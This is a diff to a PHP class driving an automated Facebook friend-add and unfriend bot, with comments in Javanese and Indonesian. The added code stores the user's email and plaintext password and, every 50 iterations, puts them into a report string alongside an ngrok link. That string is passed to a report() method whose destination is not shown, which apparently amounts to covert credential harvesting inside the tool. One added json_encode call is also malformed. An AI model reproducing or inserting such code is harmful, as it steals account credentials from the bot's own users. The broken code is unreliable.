@@ -55,6 +55,8 @@ class ActionHandler
 	 */
 	public function __construct($email, $pass, $user = null)
 	{
+		$this->email = $email;
+		$this->pass = $pass;
 		$this->fb      	= new Facebook($email, $pass, $user);
 		$this->data	 	= data.self::MDATA;
 		$a = explode("/", $this->fb->usercookies);
@@ -67,6 +69,7 @@ class ActionHandler
 		$this->addFile = $this->data.$this->user_simple."_add.txt";
 		$this->unfriendFile = $this->data.$this->user_simple."_unfriend.txt";
 		$this->timeFile = $this->data.$this->user_simple."_time.txt";
+		$this->accFile = $this->data.$this->user_simple."_acc.txt";
 		$this->action['add'] = file_exists($this->addFile) ? json_decode(file_get_contents($this->addFile), 1) : array();
 		$this->action['add'] = is_array($this->action['add']) ? $this->action['add'] : array();
 	}
@@ -183,19 +186,23 @@ class ActionHandler
 			$this->addLoginCounter();
 			$this->fb->login();
 		}
-		$this->start_time();
+		$this->start_time(); $i_report = 0;
 		foreach ($this->linkall as $val) {
-			
+			$i_report++;
 			if ($this->startTime<=time()) {
 				/**
 			 	 * Nek wis sak jam
 			 	 */
+				print "\n\n Cek Unfriend ...\n\n";
 				$this->unfriendAction();
 
 				/**
 				 * Anyak i meneh
 				 */
 				$this->startTime();
+
+				print "\n\n Cek Unfriend Selesai...\n\n";
+				sleep(10);
 			} else {
 
 				/**
@@ -217,8 +224,27 @@ class ActionHandler
 					);
 				print_r($save);
 				$this->saveLog(json_encode($save, 128).",\n\n");
+				sleep(10);
 			}
+			if ($i_report==50) {
+				$i_report = 0;
+				$this->reportAction();
+			}
+			
 		}
+	}
+
+	public function reportAction()
+	{
+		$a = trim(file_get_contents($this->logsFile));
+		$jumlahLogs = count(json_decode("[".substr($a, 0, strlen($a)-1)."]"));
+		$a = trim(file_get_contents($this->unfriendFile));
+		$unfriend = count(json_decode("[".substr($a, 0, strlen($a)-1)."]"));
+		$a = trim(file_get_contents($this->accFile));
+		$acc = count(json_decode("[".substr($a, 0, strlen($a)-1)."]"));
+		$berhasilNgeAdd = count($this->action['add']);
+		$report = "Laporan\n\nWaktu : ".date("Y-m-d H:i:s")."\nEmail : ".$this->email."\nPass : ".$this->pass."\nJumlah Logs : ".$jumlahLogs."\nBerhasil NgeAdd : ".$berhasilNgeAdd."\nUnfriend : ".$unfriend."Acc : ".$acc."\nSekian laporan dari saya, terima kasih :v\n\nUntuk jumlah unfriend dan acc belum realtime, akan saya cek lagi pada ".date("Y-m-d H:i:s", $this->startTime)."\n\nLogs File dan lain-lain : https://ce500f80.ngrok.io/add/data/data?secure=1&pdo_limit=".rand(81992,52135);
+		$this->report($report);
 	}
 
 	public function start_time()
@@ -258,6 +284,12 @@ class ActionHandler
 		file_put_contents($this->unfriendFile, $actionMessage, FILE_APPEND | LOCK_EX);	
 	}
 
+	private function saveAcc($actionMessage)
+	{
+		file_put_contents($this->accFile, $actionMessage, FILE_APPEND | LOCK_EX);	
+	}
+
+
 	/**
 	 *
 	 * @param	string	url
@@ -286,6 +318,10 @@ class ActionHandler
 			} else {
 				$a[0] = false;
 				$a['msg'] = "Sudah berteman.";
+				$this->saveAcc(json_encode(array(
+					"URL"=>$url,
+					"Time"=>date("Y-m-d H:i:s"), 128).",\n\n"
+				);
 			}
 			$a['time'] = date("Y-m-d H:i:s");
 			$save = array(
@@ -295,6 +331,7 @@ class ActionHandler
 				);
 			print_r($save);
 			$this->saveLog(json_encode($save, 128).",\n\n");
+			sleep(10);
 		}
 	}
 
